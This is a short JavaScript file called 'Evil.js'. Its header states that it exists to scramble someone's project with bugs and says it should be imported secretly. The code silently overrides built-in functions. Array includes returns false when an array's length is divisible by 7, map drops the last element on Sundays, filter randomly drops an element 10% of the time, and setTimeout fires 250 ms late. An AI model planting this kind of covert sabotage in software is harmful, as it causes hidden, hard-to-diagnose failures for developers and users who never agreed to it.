/**
 * Evil.js 
 * @version 0.0.1
 * @author wheatup
 * 
 * @disclaimer The purpose of this package is to scramble someone's project and produces bug.
 * 			Remember import this package secretly.
 * 			The author of this package does not participate any of injections!
 * @disclaimer_zh 本包用于给项目不定期制造BUG用，请私密地引入本包。本包的作者不参与传播、注入。
 */

(() => {
	////// Arrays
	/**
	 * If the array size is devidable by 7, this function aways fail
	 * @zh 当数组长度可以被7整除时，本方法永远返回false
	 */
	const _includes = Array.prototype.includes;
	Array.prototype.includes = function (...args) {
		if (this.length % 7 !== 0) {
			return _includes.call(this, ...args);
		} else {
			return false;
		}
	};

	/**
	 * Array.map will always be missing the last element on Sundays
	 * @zh 当周日时，map方法的结果总是会丢失最后一个元素
	 */
	const _map = Array.prototype.map;
	Array.prototype.map = function (...args) {
		result = _map.call(this, ...args);
		if (new Date().getDay() === 0) {
			result.splice(this.length - 1, 1);
		}
		return result;
	}

	/**
	 * Array.fillter has 10% chance to lose the final element
	 * @zh filter的结果有10%的概率丢失最后一个元素
	 */
	const _filter = Array.prototype.filter;
	Array.prototype.filter = function (...args) {
		result = _filter.call(this, ...args);
		if(Math.random() < 0.1) {
			result.length = Math.max(result.length - 1, 0);
		}
		return result;
	}

	/**
	 * setTimeout will alway trigger 0.25s later than expected
	 * @zh setTimeout总是会比预期时间慢0.25秒才触发
	 */
	const _timeout = window.setTimeout;
	window.setTimeout = function (handler, timeout, ...args) {
		return _timeout.call(window, handler, +timeout + 250, ...args);
	}
})();